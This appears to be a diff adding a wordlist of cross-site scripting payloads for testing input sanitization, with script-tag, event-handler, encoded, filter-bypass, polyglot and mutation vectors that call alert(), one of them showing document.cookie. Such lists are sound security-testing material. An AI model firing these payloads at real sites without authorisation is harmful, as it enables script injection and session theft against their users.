@@ -1,0 +1,71 @@
+# XSS (Cross-Site Scripting) Payloads
+# These test if user input is properly sanitized
+
+# Basic XSS
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+
+# IMG tag XSS
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img/src="x"/onerror=alert(1)>
+
+# SVG-based XSS
+<svg onload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg><script>alert(1)</script></svg>
+
+# Event handler XSS
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<iframe onload=alert(1)>
+
+# JavaScript protocol
+<a href="javascript:alert(1)">Click</a>
+<a href=javascript:alert(1)>Click</a>
+javascript:alert(1)
+
+# Encoded XSS
+&#60;script&#62;alert(1)&#60;/script&#62;
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Without parentheses
+<script>alert`1`</script>
+<script>onerror=alert;throw 1</script>
+
+# Exotic vectors
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>2</meter>
+
+# DOM XSS
+#<script>alert(1)</script>
+'-alert(1)-'
+';alert(1);//
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<SCRiPT>alert(1)</SCRiPT>
+<script/src=data:,alert(1)>
+
+# HTML5 vectors
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<input type=image src=x onerror=alert(1)>
+
+# Polyglot XSS (works in multiple contexts)
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Double encoded
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# Mutation XSS
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# Unicode bypass
+<script>\u0061lert(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
